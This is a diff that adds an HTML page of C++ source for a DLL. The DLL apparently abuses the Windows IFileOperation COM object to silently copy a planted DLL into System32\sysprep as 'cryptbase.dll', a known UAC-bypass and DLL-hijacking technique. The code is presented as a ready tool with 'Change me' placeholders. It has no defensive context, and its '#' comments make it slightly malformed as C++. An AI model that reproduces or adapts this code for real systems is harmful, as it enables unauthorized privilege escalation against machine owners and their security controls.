@@ -1,0 +1,66 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>iFileOperation COM Object Script</title>
+</head><body>#wusa probably easier<br/>
+#C++<br/>
+#CHANGE VARIABLES (calc.dll/cryptbase.dll/sysprep)<br/>
+<br/>
+#include &lt;stdio.h&gt;<br/>
+#include &lt;Shobjidl.h&gt;<br/>
+#include &lt;Windows.h&gt;<br/>
+<br/>
+#pragma comment(lib, &quot;Ole32.lib&quot;)<br/>
+#pragma comment(lib, &quot;shell32.lib&quot;)<br/>
+<br/>
+int WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)<br/>
+{<br/>
+  FileOperation *pfo;<br/>
+  IShellItem   *psiFrom = NULL;<br/>
+  IShellItem   *psiTo = NULL;<br/>
+  LPCWSTR pszSrcItem = L&quot;calc.dll&quot;; #Change me<br/>
+  LPCWSTR pszNewName = L&quot;cryptbase.dll&quot;; #Change me<br/>
+  LPCWSTR pszDest  = L&quot;C:\\windows\\System32\\sysprep&quot;; #Change me<br/>
+<br/>
+  HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);<br/>
+  if (SUCCEEDED(hr))<br/>
+  {<br/>
+    hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&amp;pfo));<br/>
+    if (SUCCEEDED(hr))<br/>
+    {<br/>
+      hr = pfo-&gt;SetOperationFlags( FOF_NOCONFIRMATION |<br/>
+      FOF_SILENT |<br/>
+      FOFX_SHOWELEVATIONPROMPT |<br/>
+      FOFX_NOCOPYHOOKS |<br/>
+      FOFX_REQUIREELEVATION |<br/>
+      FOF_NOERRORUI );<br/>
+      if (SUCCEEDED(hr))<br/>
+      {<br/>
+        hr = SHCreateItemFromParsingName(pszSrcItem, NULL, IID_PPV_ARGS(&amp;psiFrom));<br/>
+          if (SUCCEEDED(hr))<br/>
+          {<br/>
+            if (NULL != pszDest)<br/>
+            {<br/>
+              hr = SHCreateItemFromParsingName(pszDest, NULL, IID_PPV_ARGS(&amp;psiTo));<br/>
+            }<br/>
+						if (SUCCEEDED(hr))<br/>
+						{<br/>
+							hr = pfo-&gt;CopyItem(psiFrom, psiTo, pszNewName, NULL);<br/>
+							if (NULL != psiTo)<br/>
+							{<br/>
+              psiTo-&gt;Release();<br/>
+							}<br/>
+						}<br/>
+						psiFrom-&gt;Release();<br/>
+					}<br/>
+				if (SUCCEEDED(hr))<br/>
+				{<br/>
+					hr = pfo-&gt;PerformOperations();<br/>
+				}<br/>
+			}<br/>
+			pfo-&gt;Release();<br/>
+    }<br/>
+    CoUninitialize();<br/>
+  }<br/>
+  return 0;<br/>
+}</body></html>
